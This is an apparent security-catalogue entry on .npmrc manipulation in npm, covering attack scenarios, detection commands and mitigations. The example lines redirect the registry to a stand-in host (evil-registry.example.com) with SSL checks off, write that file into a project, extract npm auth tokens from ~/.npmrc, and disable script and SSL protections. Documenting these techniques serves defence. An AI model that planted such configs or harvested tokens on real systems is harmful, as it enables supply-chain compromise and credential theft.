---
name: ".npmrc Manipulation"
packageManager: "npm"
slug: "npm-npmrc-manipulation"
category: "Configuration Abuse"
severity: "medium"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: ".npmrc files control npm behavior including registry URLs, authentication tokens, and script execution settings. An attacker with file write access to a project or user-level .npmrc can redirect all package installations to a malicious registry, steal auth tokens, or re-enable dangerous script execution. Because npm loads .npmrc from multiple locations (project, user, global), a single malicious file can silently compromise an entire development workflow."
prerequisites:
  - "Write access to the target filesystem (project directory, user home directory, or global npm config)"
  - "Target must subsequently run npm install or similar npm commands"
attackScenarios:
  - title: "Redirecting Registry to a Malicious Server"
    description: "An attacker with write access to the project directory places a .npmrc file that points the npm registry to an attacker-controlled server. All subsequent npm install commands will fetch trojanized packages from the malicious registry instead of the official one."
    commands:
      - label: "Malicious .npmrc redirecting the default registry"
        code: |
          registry=https://evil-registry.example.com/
          strict-ssl=false
        language: "ini"
      - label: "Dropping the malicious .npmrc into a project"
        code: |
          echo -e "registry=https://evil-registry.example.com/\nstrict-ssl=false" > /path/to/project/.npmrc
        language: "bash"
  - title: "Stealing npm Auth Tokens"
    description: "If a developer's ~/.npmrc contains an auth token for publishing packages, an attacker with read access to the home directory can extract the token and use it to publish malicious versions of the developer's packages."
    commands:
      - label: "Extracting auth tokens from ~/.npmrc"
        code: |
          cat ~/.npmrc | grep '_authToken'
          # Output: //registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXX
        language: "bash"
  - title: "Disabling Security Controls via .npmrc"
    description: "An attacker modifies .npmrc to disable ignore-scripts, disable strict SSL verification, or allow running as root, weakening the security posture of npm operations."
    commands:
      - label: ".npmrc that disables security protections"
        code: |
          ignore-scripts=false
          strict-ssl=false
          unsafe-perm=true
          audit=false
        language: "ini"
detection:
  - title: "Audit .npmrc Files Across All Locations"
    description: "Regularly check for .npmrc files in project directories, user home directories, and global npm config paths. Verify that registry URLs point to expected registries and that no unexpected auth tokens are present."
    commands:
      - code: "npm config list -l 2>/dev/null | grep -E 'registry|_authToken|strict-ssl|ignore-scripts'"
        language: "bash"
      - code: "find / -name '.npmrc' -type f 2>/dev/null | head -20"
        language: "bash"
  - title: "Monitor .npmrc Changes in Version Control"
    description: "Ensure .npmrc files in project repositories are tracked in version control and changes are reviewed. Use CI/CD checks to validate that the registry URL has not been tampered with."
    commands:
      - code: "git diff HEAD -- .npmrc"
        language: "bash"
mitigation:
  - "Track .npmrc files in version control and require code review for any changes to registry or auth settings"
  - "Never store auth tokens in project-level .npmrc files; use environment variables or npm login sessions instead"
  - "Enforce strict-ssl=true and verify registry URLs in CI/CD pipeline pre-checks"
  - "Use file integrity monitoring to detect unauthorized changes to .npmrc in developer home directories"
  - "Restrict filesystem write access on CI/CD build agents to prevent unauthorized .npmrc placement"
references:
  - title: "npm .npmrc Configuration Documentation"
    url: "https://docs.npmjs.com/cli/v10/configuring-npm/npmrc"
  - title: "npm Config Settings Reference"
    url: "https://docs.npmjs.com/cli/v10/using-npm/config"
  - title: "Securing the npm Supply Chain - GitHub Blog"
    url: "https://github.blog/security/supply-chain-security/"
created: 2026-04-02
updated: 2026-04-02
---
